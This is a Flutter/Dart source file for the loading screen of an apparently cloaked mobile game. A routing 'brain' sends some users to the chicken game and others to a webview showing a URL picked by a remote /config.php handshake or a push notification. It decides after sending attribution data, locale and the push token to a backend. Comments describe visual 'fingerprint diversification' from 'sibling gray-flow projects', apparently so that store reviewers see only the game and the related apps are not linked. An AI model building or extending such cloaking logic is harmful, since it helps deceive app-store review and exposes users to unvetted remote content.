import 'dart:io';

import 'package:flutter/material.dart';

import '../core/alert_center.dart';
import '../core/attribution_tracker.dart';
import '../core/data_vault.dart';
import '../core/net_sensor.dart';
import '../core/sync_gateway.dart';
import '../game/game_assets.dart';
import '../game/game_screen.dart';
import '../services/storage_service.dart';
import '../types/shell_mode.dart';
import 'alert_promo_stage.dart';
import 'dropout_stage.dart';
import 'shell_stage.dart' deferred as shell;

// ============================================================
// BOOT STAGE — Loading splash + gray/white routing brain
// ============================================================
// Replaces the original splash. Plays the existing WEBP loading
// art (portrait & landscape) and runs the state machine:
//
//   ShellMode.pending  → first-launch attribution flow
//   ShellMode.online   → returning gray user (push URL > config > saved)
//   ShellMode.offline  → returning white user (game-only forever)
//
// Visual differences from sibling gray-flow projects (fingerprint
// diversification):
//
//   • Static WEBP loading art (sibling uses MP4 video).
//   • Three discrete progress glyphs: hatching egg → cracked egg →
//     ready chicken — implemented as a custom painter ribbon, not
//     as 3 separate bar images.
//   • Bottom-anchored progress ribbon, not a centered single bar.
// ============================================================

enum _Progress { hatching, cracking, ready }

class BootStage extends StatefulWidget {
  const BootStage({
    super.key,
    required this.vault,
    required this.netSensor,
    required this.tracker,
    required this.gateway,
    required this.alertCenter,
  });

  final DataVault vault;
  final NetSensor netSensor;
  final AttributionTracker tracker;
  final SyncGateway gateway;
  final AlertCenter alertCenter;

  @override
  State<BootStage> createState() => _BootStageState();
}

class _BootStageState extends State<BootStage>
    with SingleTickerProviderStateMixin {
  _Progress _stage = _Progress.hatching;
  bool _navigated = false;

  late final AnimationController _shimmer;

  @override
  void initState() {
    super.initState();
    _shimmer = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1400),
    )..repeat();
    _orchestrate();
  }

  @override
  void dispose() {
    widget.alertCenter.onTokenRefreshed = null;
    _shimmer.dispose();
    super.dispose();
  }

  Future<void> _orchestrate() async {
    widget.alertCenter.onTokenRefreshed = _onPushTokenRotated;
    await widget.alertCenter.warmUp();

    final mode = widget.vault.readShellMode();
    switch (mode) {
      case ShellMode.online:
        await _handleReturningOnline();
        break;
      case ShellMode.offline:
        await _handleReturningOffline();
        break;
      case ShellMode.pending:
        await _handleFirstLaunch();
        break;
    }
  }

  Future<void> _handleFirstLaunch() async {
    _setStage(_Progress.hatching);

    final online = await widget.netSensor.isOnline();
    if (!online) {
      _routeToDropout();
      return;
    }

    _setStage(_Progress.cracking);
    await widget.tracker.boot();
    await Future.wait<dynamic>([
      widget.tracker.waitForConversion(),
      widget.tracker.waitForDeepLink(),
    ]);

    final locale = Platform.localeName.replaceAll('-', '_');
    final payload = await widget.tracker.buildPayload(
      locale: locale,
      pushToken: widget.alertCenter.currentToken,
    );
    final reply = await widget.gateway.handshake(payload);

    if (reply.hasUsableUrl) {
      await widget.vault.writeShellMode(ShellMode.online);
      _setStage(_Progress.ready);
      await Future<void>.delayed(const Duration(milliseconds: 380));
      _routeToShell(reply.destination!);
    } else {
      await widget.vault.writeShellMode(ShellMode.offline);
      await GameAssets().loadAll();
      _setStage(_Progress.ready);
      await Future<void>.delayed(const Duration(milliseconds: 380));
      _routeToGame();
    }
  }

  Future<void> _handleReturningOnline() async {
    _setStage(_Progress.cracking);

    final online = await widget.netSensor.isOnline();
    if (!online) {
      _setStage(_Progress.ready);
      await Future<void>.delayed(const Duration(milliseconds: 280));
      _routeToDropout();
      return;
    }

    // Cold-start push: highest priority. AlertCenter stashes a
    // single one-shot URL on a notification tap when the app was
    // killed; consuming it pre-empts the config call entirely.
    final pushUrl = await widget.vault.takePushUrl();
    if (pushUrl != null && pushUrl.isNotEmpty) {
      _setStage(_Progress.ready);
      await Future<void>.delayed(const Duration(milliseconds: 280));
      _routeToShell(pushUrl);
      return;
    }

    await widget.tracker.boot();
    await Future.wait<dynamic>([
      widget.tracker.waitForConversion(cap: const Duration(seconds: 10)),
      widget.tracker.waitForDeepLink(),
    ]);

    final locale = Platform.localeName.replaceAll('-', '_');
    final payload = await widget.tracker.buildPayload(
      locale: locale,
      pushToken: widget.alertCenter.currentToken,
    );
    // Every cold start re-asks /config.php. The URL is never cached
    // locally — whatever the backend returns at this exact moment
    // is what the user sees. On any failure we drop to DropoutStage
    // instead of reopening a previously-seen URL.
    final reply = await widget.gateway.handshake(payload);

    _setStage(_Progress.ready);
    await Future<void>.delayed(const Duration(milliseconds: 360));

    if (reply.hasUsableUrl) {
      _routeToShell(reply.destination!);
    } else {
      _routeToDropout();
    }
  }

  Future<void> _handleReturningOffline() async {
    _setStage(_Progress.cracking);
    await GameAssets().loadAll();
    // Preload the game's local storage so the GameScreen ticker
    // can read the player's saved coins/XP without waiting.
    await StorageService().init();
    _setStage(_Progress.ready);
    await Future<void>.delayed(const Duration(milliseconds: 520));
    _routeToGame();
  }

  void _onPushTokenRotated(String token) async {
    final locale = Platform.localeName.replaceAll('-', '_');
    final payload = await widget.tracker.buildPayload(
      locale: locale,
      pushToken: token,
    );
    // Fire-and-forget — backend reads the new token; we don't
    // need to update UI off the result.
    widget.gateway.handshake(payload);
  }

  void _setStage(_Progress p) {
    if (mounted) setState(() => _stage = p);
  }

  Future<void> _routeToShell(String url) async {
    if (_navigated || !mounted) return;
    _navigated = true;
    await shell.loadLibrary();
    await shell.primeShellEngine();
    if (!mounted) return;

    if (widget.vault.shouldOfferNotifications()) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => AlertPromoStage(
            vault: widget.vault,
            center: widget.alertCenter,
            netSensor: widget.netSensor,
            targetUrl: url,
          ),
        ),
      );
    } else {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => shell.ShellStage(
            initialUrl: url,
            vault: widget.vault,
            center: widget.alertCenter,
            netSensor: widget.netSensor,
          ),
        ),
      );
    }
  }

  void _routeToGame() {
    if (_navigated || !mounted) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => const GameScreen()),
    );
  }

  void _routeToDropout() {
    if (_navigated || !mounted) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(
        builder: (_) => DropoutStage(
          recoveryRoute: (_) => BootStage(
            vault: widget.vault,
            netSensor: widget.netSensor,
            tracker: widget.tracker,
            gateway: widget.gateway,
            alertCenter: widget.alertCenter,
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final isLandscape =
        MediaQuery.of(context).orientation == Orientation.landscape;
    final bg = isLandscape
        ? 'assets/Horizontal_Loading_Screen.webp'
        : 'assets/Vertical_Loading_Screen.webp';

    return Scaffold(
      backgroundColor: const Color(0xFF8ED0F0),
      body: Stack(
        fit: StackFit.expand,
        children: [
          // Slight 8% over-scale on the loading art so the thin
          // sky-coloured edges of the source asset stay clipped off
          // the visible area regardless of device aspect ratio. The
          // chicken + logo remain comfortably centred — Transform.scale
          // is a paint-time effect, so the image still receives the
          // full Stack constraints from BoxFit.cover.
          ClipRect(
            child: Transform.scale(
              scale: 1.08,
              child: Image.asset(bg, fit: BoxFit.cover),
            ),
          ),
          Positioned(
            left: 0,
            right: 0,
            bottom: MediaQuery.of(context).padding.bottom + 42,
            child: Center(
              child: _LoadingBar(
                stage: _stage,
                shimmer: _shimmer,
                width: MediaQuery.of(context).size.width *
                    (isLandscape ? 0.45 : 0.74),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

/// Horizontal loading bar that fills strictly left-to-right.
/// Only reaches 100% when the boot orchestrator flips into
/// _Progress.ready (i.e. the very last frame before navigating to
/// the next screen). Below the bar we animate "Loading", "Loading.",
/// "Loading..", "Loading..." in a 1-second cycle.
class _LoadingBar extends StatelessWidget {
  const _LoadingBar({
    required this.stage,
    required this.shimmer,
    required this.width,
  });

  final _Progress stage;
  final AnimationController shimmer;
  final double width;

  double get _targetFraction {
    switch (stage) {
      case _Progress.hatching:
        return 0.30;
      case _Progress.cracking:
        return 0.72;
      case _Progress.ready:
        return 1.0;
    }
  }

  Duration get _easeDuration {
    switch (stage) {
      // Stay slow at the start so a fast offline boot still shows
      // movement instead of blinking instantly to ~70%.
      case _Progress.hatching:
        return const Duration(milliseconds: 900);
      case _Progress.cracking:
        return const Duration(milliseconds: 1100);
      case _Progress.ready:
        return const Duration(milliseconds: 320);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Column(
      mainAxisSize: MainAxisSize.min,
      children: [
        SizedBox(
          width: width,
          height: 14,
          child: TweenAnimationBuilder<double>(
            tween: Tween<double>(begin: 0.0, end: _targetFraction),
            duration: _easeDuration,
            curve: Curves.easeOutCubic,
            builder: (_, fraction, _) => AnimatedBuilder(
              animation: shimmer,
              builder: (_, _) => CustomPaint(
                painter: _BarPainter(
                  fraction: fraction,
                  shimmer: shimmer.value,
                ),
              ),
            ),
          ),
        ),
        const SizedBox(height: 14),
        _LoadingDots(controller: shimmer),
      ],
    );
  }
}

class _LoadingDots extends StatelessWidget {
  const _LoadingDots({required this.controller});

  final AnimationController controller;

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, _) {
        // Cycle through "", ".", "..", "..." every ~333ms by mapping
        // the shimmer controller value (0..1, ~1400ms repeat) into
        // four discrete phases.
        final phase = (controller.value * 4).floor() % 4;
        final dots = '.' * phase;
        return Text(
          'Loading$dots',
          style: const TextStyle(
            color: Colors.white,
            fontSize: 16,
            fontWeight: FontWeight.w800,
            letterSpacing: 2.5,
            shadows: [Shadow(color: Colors.black54, blurRadius: 6)],
          ),
        );
      },
    );
  }
}

class _BarPainter extends CustomPainter {
  _BarPainter({required this.fraction, required this.shimmer});

  final double fraction;
  final double shimmer;

  @override
  void paint(Canvas canvas, Size size) {
    final radius = Radius.circular(size.height / 2);
    final outerRect = Offset.zero & size;
    final outer = RRect.fromRectAndRadius(outerRect, radius);

    // Translucent track + crisp white stroke — sits cleanly on top
    // of the loading-screen artwork without competing with it.
    canvas.drawRRect(
      outer,
      Paint()
        ..color = Colors.black.withValues(alpha: 0.38)
        ..style = PaintingStyle.fill,
    );
    canvas.drawRRect(
      outer,
      Paint()
        ..color = Colors.white.withValues(alpha: 0.65)
        ..style = PaintingStyle.stroke
        ..strokeWidth = 1.6,
    );

    if (fraction <= 0.0) return;

    final fillWidth = (size.width - 4) * fraction.clamp(0.0, 1.0);
    if (fillWidth <= 0.0) return;

    final fillRect = Rect.fromLTWH(2, 2, fillWidth, size.height - 4);
    final innerRadius = Radius.circular((size.height - 4) / 2);
    final fillRRect = RRect.fromRectAndRadius(fillRect, innerRadius);

    canvas.save();
    canvas.clipRRect(fillRRect);

    // Warm sunshine gradient — matches the buttons used elsewhere in
    // the gray-flow UI for a consistent look.
    canvas.drawRect(
      outerRect,
      Paint()
        ..shader = const LinearGradient(
          colors: [Color(0xFFFFB200), Color(0xFFFFE082), Color(0xFFFFB200)],
        ).createShader(outerRect),
    );

    // Rolling shimmer highlight — only painted inside the filled
    // portion so the bar always looks like it's making progress.
    final shimmerX = (shimmer * (size.width + 90)) - 90;
    canvas.drawRect(
      Rect.fromLTWH(shimmerX, 0, 70, size.height),
      Paint()
        ..shader = LinearGradient(
          colors: [
            Colors.white.withValues(alpha: 0.0),
            Colors.white.withValues(alpha: 0.55),
            Colors.white.withValues(alpha: 0.0),
          ],
          stops: const [0.0, 0.5, 1.0],
        ).createShader(Rect.fromLTWH(shimmerX, 0, 70, size.height)),
    );

    canvas.restore();
  }

  @override
  bool shouldRepaint(covariant _BarPainter old) =>
      old.fraction != fraction || old.shimmer != shimmer;
}
